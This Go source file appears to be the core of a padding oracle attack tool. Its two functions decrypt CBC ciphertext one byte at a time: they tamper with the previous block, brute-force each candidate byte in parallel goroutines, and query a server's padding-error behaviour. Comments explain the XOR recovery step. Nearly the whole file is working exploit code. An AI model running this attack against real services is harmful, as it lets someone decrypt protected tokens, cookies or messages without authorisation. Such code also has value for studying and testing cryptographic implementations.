package main

import (
	"context"
	"log"
)

func decipherChunk(chunk []byte) ([]byte, error) {
	/* okay, we're now very close to the Padding Oracle core technique */
	plainText := make([]byte, blockLen)

	// we start with the last byte of first block
	// and repeat the same procedure for every byte in that block

	for pos := blockLen - 1; pos >= 0; pos-- {
		log.Printf("Getting pos %d", pos)
		originalByte := chunk[pos]

		found, foundByte, err := findGoodByte(chunk, pos, originalByte)
		if err != nil {
			log.Fatal(err)
		}

		// okay, let's check how we ended up inside the loop above
		if !found {
			// well, seems like the only valid padding is the original byte
			// that can happen if we just hit the original padding in our tampering attempts
			// so, let it be, but also check that to be sure
			chunk[pos] = originalByte
			paddingError, err := isPaddingError(chunk, nil)
			if err != nil {
				log.Fatal(err)
			}

			if paddingError {
				log.Fatal("Failed to decrypt, not a byte got in without padding error. \nThe root cause migth be in Unpadding implementation on the server side!")
			}

			log.Printf("Only original byte fits at position %d.You probably just hit the original padding", pos)
			foundByte = originalByte
		}

		/* okay, now that we found the byte that fits, we can reveal the plaintext byte with some XOR magic
		a little explanation of below logic
		OCB = original cipher byte of block n-1
		TCB = tampered cipher byte of block n-1
		OPT = original plaintext byte of block n (the one that we trying to reveal)
		TPT = tampered plaintext byte of block n (the one we suppose we know, given absence of padding error)

		if OCB ^ OPT = valid padding
		and TCP ^ OPT = TPT = fake but valid padding
		then OPT = OCB ^ TCB ^ TPT */
		currPaddingValue := byte(16 - pos)
		plainText[pos] = foundByte ^ originalByte ^ currPaddingValue

		/* good! we're done with this byte, do we forget something?
		yes, we actually need to repair the padding for the next shot
		e.g. we need to adjust the already tapered bytes of first */
		chunk[pos] = foundByte
		nextPaddingValue := currPaddingValue + 1
		adjustingValue := currPaddingValue ^ nextPaddingValue
		for i := pos; i < blockLen; i++ {
			chunk[i] ^= adjustingValue
		}
	}

	// now we're ready to return our revealed plaintext
	return plainText, nil
}

func findGoodByte(chunk []byte, pos int, original byte) (bool, byte, error) {
	// the common steps before we hit the parallel universe
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	chanErr := make(chan error)
	chanVal := make(chan byte)
	chanPara := make(chan byte, 20)
	chanDone := make(chan byte, 0xff)

	for i := 0; i < 0xff; i++ {
		tamperedByte := byte(i)

		// we skip the original byte, since we know it's okay
		// but we can come back to it later as for the last resort
		if tamperedByte == original {
			continue
		}

		go func(value byte) {
			defer func() { chanDone <- 0 }()

			chanPara <- 1
			defer func() { <-chanPara }()

			// change the byte to tampered one
			// this has to be synced since we have one chunk for all parallel routines
			chunkCopy := make([]byte, len(chunk))
			copy(chunkCopy, chunk)
			chunkCopy[pos] = value

			// test for padding oracle
			paddingError, err := isPaddingError(chunkCopy, &ctx)

			if err != nil {
				if ctx.Err() != context.Canceled {
					log.Println(err)
					chanErr <- err
				}
				return
			}
			if !paddingError {
				log.Printf("found good value! for %d", value)
				chanVal <- value
			}
		}(tamperedByte)
	}

	// now process the results
	//t := time.NewTicker(time.Second * 5)
	done := 1
	for {
		select {
		case <-chanDone:
			done++
			//log.Printf("Done: %d\n", done)
			if done == 0xff {
				return false, 0, nil
			}
		case err := <-chanErr:
			log.Println("ErrChan")
			return false, 0, err
		case val := <-chanVal:
			log.Println("valChan")
			return true, val, nil
		default:
			continue
		}
	}
}
